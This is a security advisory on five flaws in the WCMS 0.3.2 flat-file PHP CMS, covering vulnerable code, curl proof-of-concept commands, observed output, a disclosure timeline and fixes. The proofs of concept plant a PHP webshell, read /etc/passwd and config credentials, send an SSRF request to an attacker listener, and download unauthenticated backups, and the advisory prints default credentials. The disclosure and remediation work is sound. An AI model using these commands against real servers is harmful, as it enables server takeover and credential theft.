# Multiple Vulnerabilities in WCMS 0.3.2 (vedees/wcms)

## Overview

Five security vulnerabilities were discovered in [WCMS](https://github.com/vedees/wcms) version 0.3.2, a lightweight flat-file CMS. All findings were reported to VulnCheck for coordinated disclosure. CVE assignment was declined due to the project's limited user base and unmaintained status (no commits since 2022). VulnCheck confirmed the project is abandoned and approved public disclosure.

| ID | Vulnerability | CWE | CVSS 3.1 |
|----|--------------|-----|----------|
| WCMS-2026-01 | [Unrestricted File Upload → RCE](#wcms-2026-01) | CWE-434 | 7.1 (High) |
| WCMS-2026-02 | [Arbitrary File Write → RCE](#wcms-2026-02) | CWE-73 | 7.2 (High) |
| WCMS-2026-03 | [Arbitrary File Read / LFI](#wcms-2026-03) | CWE-22 | 4.9 (Medium) |
| WCMS-2026-04 | [SSRF + LFI + Arbitrary Write](#wcms-2026-04) | CWE-918 | 6.5 (Medium) |
| WCMS-2026-05 | [Unauthenticated Backup Disclosure](#wcms-2026-05) | CWE-538 | 7.5 (High) |

**Environment:** PHP 8.1.34, Apache 2.4.65, local Docker  
**Prior CVEs:** CVE-2024-8875 (path traversal delete via finder.php) — none of these findings overlap it  
**Discovered by:** Marxabo Keldibekova  
**Coordinated by:** [VulnCheck](https://vulncheck.com/)

---

<a id="wcms-2026-01"></a>
## WCMS-2026-01: Unrestricted File Upload → RCE

**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H — **7.1 (High)**  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

### Vulnerable Code

`wex/includes/finder/actions.php` (lines 214-245):

```php
if (isset($_POST['upl'])) {
  $path = FM_ROOT_PATH . ($FM_PATH ? '/' . $FM_PATH : '');
  for ($i = 0; $i < $total; $i++) {
    $tmp_name = $_FILES['upload']['tmp_name'][$i];
    if (!empty($tmp_name)) {
      move_uploaded_file($tmp_name, $path . '/' . $_FILES['upload']['name'][$i]);
      // no extension check
    }
  }
}
```

No allow-list, blacklist, or MIME check on the uploaded filename. Any extension (`.php`, `.phtml`) is accepted and written to the public webroot.

### Proof of Concept

```bash
# 1. Authenticate (default credentials)
curl -s -c cookies.txt -X POST http://TARGET/wex/login.php \
  -d "login=admin&password=12345&login_submit=1"

# 2. Upload PHP webshell
curl -s -b cookies.txt -X POST "http://TARGET/wex/finder.php?p=" \
  -F "upl=1" -F "upload[]=@shell.php;filename=shell.php;type=application/x-php"

# 3. Execute (unauthenticated, in public webroot)
curl -s "http://TARGET/shell.php?cmd=id"
```

**Response:** `uid=0(root) gid=0(root) groups=0(root)` — HTTP 200

---

<a id="wcms-2026-02"></a>
## WCMS-2026-02: Arbitrary File Write → RCE (html.php, images.php)

**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H — **7.2 (High)**  
**CWE:** CWE-73 (External Control of File Name or Path)

### Vulnerable Code

`wex/html.php` (lines 20-24):

```php
if (isset($_GET['finish'])) {
  $path = $_GET['finish'];
  file_put_contents($path, $_POST['textAreaCode']);
}
```

`wex/images.php` (lines 25-29):

```php
if (isset($_GET['img'])) {
  $imgname = $_GET['img'];
  move_uploaded_file($_FILES['inputForImages']['tmp_name'], $imgname);
}
```

Both endpoints use raw user input as the destination path — no `basename()`, no directory confinement, no extension filtering. Strictly more powerful than WCMS-2026-01 since they allow writing to absolute paths outside the webroot.

### Proof of Concept — html.php

```bash
curl -s -b cookies.txt -X POST \
  "http://TARGET/wex/html.php?finish=/var/www/html/shell.php" \
  --data-urlencode 'textAreaCode=<?php system($_GET["cmd"]); ?>'

curl -s "http://TARGET/shell.php?cmd=id"
```

**Response:** `uid=0(root) gid=0(root) groups=0(root)` — HTTP 200

### Proof of Concept — images.php

```bash
curl -s -b cookies.txt -X POST \
  "http://TARGET/wex/images.php?img=/var/www/html/shell2.php" \
  -F "inputForImages=@shell.php;type=application/x-php"

curl -s "http://TARGET/shell2.php?cmd=id"
```

**Response:** `uid=0(root) gid=0(root) groups=0(root)` — HTTP 200

---

<a id="wcms-2026-03"></a>
## WCMS-2026-03: Arbitrary File Read / LFI (cssjs.php)

**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N — **4.9 (Medium)**  
**CWE:** CWE-22 (Path Traversal)

### Vulnerable Code

`wex/cssjs.php` (lines 30-32):

```php
if (isset($_GET['path'])) {
  $path = $_GET['path'];
  $html_from_template = htmlspecialchars(file_get_contents($path));
}
```

No directory confinement or extension check. Output is `htmlspecialchars`-encoded (no XSS) but full file contents are disclosed.

### Proof of Concept

```bash
curl -s -b cookies.txt "http://TARGET/wex/cssjs.php?path=/etc/passwd&type=css"
```

**Response:** HTTP 200, response body contains full `/etc/passwd` contents. Also confirmed reading `config.php` which exposes admin credentials.

---

<a id="wcms-2026-04"></a>
## WCMS-2026-04: SSRF + LFI + Arbitrary Write (Pagename.php)

**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N — **6.5 (Medium)**  
**CWE:** CWE-918 (Server-Side Request Forgery), CWE-73

### Vulnerable Code

`wex/core/classes/Pagename.php` (lines 14-39):

```php
if (isset($_POST['pagename'])) {
  $_SESSION['pagename'] = $_POST['pagename'];  // no validation
}
$GLOBALS['template'] = file_get_contents($GLOBALS['pagename']);
$GLOBALS['html'] = file_get_html($GLOBALS['pagename']);
```

Session-persisted attacker path fed into `file_get_contents()` on every authenticated page load. Since `file_get_contents` follows PHP stream wrappers (`allow_url_fopen` on by default), URLs like `http://169.254.169.254/` trigger outbound SSRF.

### Proof of Concept — SSRF

```bash
curl -s -b cookies.txt -X POST "http://TARGET/wex/index.php" \
  -d "pagename=http://attacker-listener:8199/ssrf-marker"
```

**Observed:** 2 inbound GET requests from WCMS server to attacker listener.

### Proof of Concept — Arbitrary Write

```bash
curl -s -b cookies.txt -X POST "http://TARGET/wex/index.php" \
  -d "pagename=/path/to/target/file.html"

curl -s -b cookies.txt "http://TARGET/wex/text.php?id=0&type=headline&text=PWNED"
```

**Observed:** Target file's headline overwritten, confirmed on a path outside SITE_DIR.

---

<a id="wcms-2026-05"></a>
## WCMS-2026-05: Unauthenticated Backup Disclosure

**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — **7.5 (High)**  
**CWE:** CWE-538 (Insertion of Sensitive Information into Externally-Accessible File)

### Vulnerable Code

`wex/core/classes/backup.php` (lines 15-53):

```php
$zipname = BACKUP_DIR . date('d-m-Y_H:i:s') . '.zip';
$zipper->create($zipname, $files);
```

`BACKUP_DIR` = `wex/backups/` — inside the public webroot, no `.htaccess`, no authentication gate. Filenames use `date('d-m-Y_H:i:s')` with no random component — 86,400 values per day, trivially brute-forceable.

The archive includes `config.php` which stores `$GLOBALS['admin_password']` in plaintext.

### Proof of Concept

```bash
# No login needed — just guess the backup timestamp
curl -s -o stolen.zip "http://TARGET/wex/backups/29-08-2026_08:21:14.zip"

unzip stolen.zip config.php && cat config.php
```

**Response:** HTTP 200, valid ZIP downloaded without authentication. Extracted `config.php` contains:

```php
$GLOBALS['admin_name'] = 'admin';
$GLOBALS['admin_password'] = '12345';
```

**Impact:** This is the most severe finding — it removes the authentication precondition from all other post-auth vulnerabilities, making them effectively unauthenticated.

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-08-29 | All 5 vulnerabilities submitted to VulnCheck for coordinated disclosure |
| 2026-09-02 | VulnCheck declines CVE assignment — project has limited user base and is unmaintained |
| 2026-09-04 | VulnCheck confirms public disclosure is appropriate — project abandoned (no commits in 4+ years) |
| 2026-09-05 | Public disclosure via GitHub |

## Remediation

1. **File uploads/writes:** Enforce strict file-extension allow-lists and confine paths via `realpath()` + prefix check
2. **File reads:** Restrict to fixed allow-listed directories
3. **SSRF:** Reject values containing `://` in `pagename`
4. **Backups:** Store outside web root, add authentication gate, use random filenames
5. **Credentials:** Force password change on first run instead of shipping `admin:12345`

## References

- [WCMS Repository](https://github.com/vedees/wcms)
- [CVE-2024-8875 — Prior WCMS CVE](https://www.cve.org/CVERecord?id=CVE-2024-8875)
- [VulnCheck](https://vulncheck.com/)
